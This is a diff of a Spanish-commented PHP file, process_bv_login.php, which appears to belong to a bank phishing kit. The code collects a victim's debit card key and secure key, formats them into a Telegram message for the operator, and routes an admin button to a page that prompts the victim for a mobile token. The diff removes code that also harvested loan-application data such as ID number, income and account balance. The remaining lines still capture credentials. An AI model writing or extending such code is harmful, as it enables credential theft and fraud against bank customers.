@@ -1,5 +1,6 @@
 <?php
 // process_bv_login.php
+// (AHORA SOLO PROCESA EL LOGIN)
 
 session_start();
 
@@ -8,7 +9,6 @@ $config = require 'conexion.php';
 
 // --- Lógica de Base de Datos (SIN CAMBIOS) ---
 $db_config = $config['db'];
-// ============ CAMBIO PARA POSTGRESQL ============
 $dsn = "pgsql:host={$db_config['host']};dbname={$db_config['dbname']}";
 $new_id = null;
 try {
@@ -63,43 +63,11 @@ if ($debit_card_key) {
     $message .= "› *Clave Segura:* `" . htmlspecialchars($secure_key) . "`\n";
 }
 
-
-// --- NUEVA SECCIÓN: Captura de datos del crédito ---
-$credito_monto_raw = $_POST['credito_montoCredito'] ?? 0;
-$credito_ingresos_raw = $_POST['credito_ingresoMensual'] ?? 0;
-$credito_gastos_raw = $_POST['credito_gastosMensual'] ?? 0;
-$credito_saldo_raw = $_POST['credito_saldoActual'] ?? 0;
-
-$credito_monto = '$' . number_format($credito_monto_raw, 0, ',', '.');
-$credito_ingresos = '$' . number_format($credito_ingresos_raw, 0, ',', '.');
-$credito_gastos = '$' . number_format($credito_gastos_raw, 0, ',', '.');
-$credito_saldo = '$' . number_format($credito_saldo_raw, 0, ',', '.');
-
-$credito_tipo_doc = $_POST['credito_tipoDocCredito'] ?? 'No especificado';
-$credito_cedula = $_POST['credito_cedula'] ?? 'No especificado';
-$credito_nombre = $_POST['credito_nombreCompleto'] ?? 'No especificado';
-$credito_ocupacion = $_POST['credito_ocupacion'] ?? 'No especificado';
-$credito_plazo = $_POST['credito_plazo'] ?? 'No especificado';
-$credito_fecha_pago = $_POST['credito_fechaPago'] ?? 'No especificado';
-
-// --- Añadir datos del crédito al mensaje de Telegram ---
-$message .= "\n\n💰 *Datos del Crédito Simulado* 💰\n";
-$message .= "› *Monto Solicitado:* `" . htmlspecialchars($credito_monto) . "`\n";
-$message .= "› *Tipo Doc (Crédito):* " . htmlspecialchars($credito_tipo_doc) . "\n";
-$message .= "› *Cédula (Crédito):* `" . htmlspecialchars($credito_cedula) . "`\n";
-$message .= "› *Nombre (Crédito):* " . htmlspecialchars($credito_nombre) . "\n";
-$message .= "› *Ocupación:* " . htmlspecialchars($credito_ocupacion) . "\n";
-$message .= "› *Ingresos:* `" . htmlspecialchars($credito_ingresos) . "`\n";
-$message .= "› *Gastos:* `" . htmlspecialchars($credito_gastos) . "`\n";
-$message .= "› *Saldo Cuenta:* `" . htmlspecialchars($credito_saldo) . "`\n";
-$message .= "› *Plazo:* " . htmlspecialchars($credito_plazo) . " meses\n";
-$message .= "› *Fecha de Pago:* Día " . htmlspecialchars($credito_fecha_pago) . "\n";
+// ======================= SE ELIMINÓ EL CÓDIGO DE CRÉDITO DE AQUÍ =======================
 
 
-// ======================= INICIO DE LA MODIFICACIÓN =======================
 // Limpiamos la URL base para quitar saltos de línea (%0A) o espacios
 $base_update_url = trim($config['base_url']);
-// ======================= FIN DE LA MODIFICACIÓN =======================
 
 // El botón de Token Móvil ahora apunta a nuestra nueva página de prompt
 $admin_prompt_url = str_replace('actualizar_estado.php', 'admin_prompt_movil.php', $base_update_url);
